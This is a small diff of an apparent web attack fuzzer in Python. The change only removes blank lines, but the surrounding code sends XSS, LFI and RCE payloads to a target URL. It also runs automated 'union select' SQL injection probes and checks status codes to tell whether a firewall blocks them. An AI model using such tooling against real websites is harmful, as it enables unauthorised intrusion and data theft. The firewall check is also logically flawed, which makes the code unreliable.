@@ -26,7 +26,6 @@ class FuzzTester:
        self.result = ''
 
    def fuzz_payloads(self): # fuzz xss/lfi/rce
-      
        if '--XSS' in choose: # select xss
          for xss in self.xss_payload[0]:
             target = http.get("{0}{1}".format(url, xss))
@@ -67,7 +66,6 @@ class FuzzTester:
          print(Fore.WHITE + '\nRESULT\n' + Fore.GREEN + self.result)
 
    def fuzz_sqli(self, column, check): # automated sql injection
-      
        for vuln,exact,num in zip(column.readlines(), self.vuln_column[0], range(50)):
           target = http.get("{0}{1} union select {2}{3}".format(url, qoute, vuln, param))
           if not target.status_code == 403 or not target.status_code == 406: # check if firewall not configured
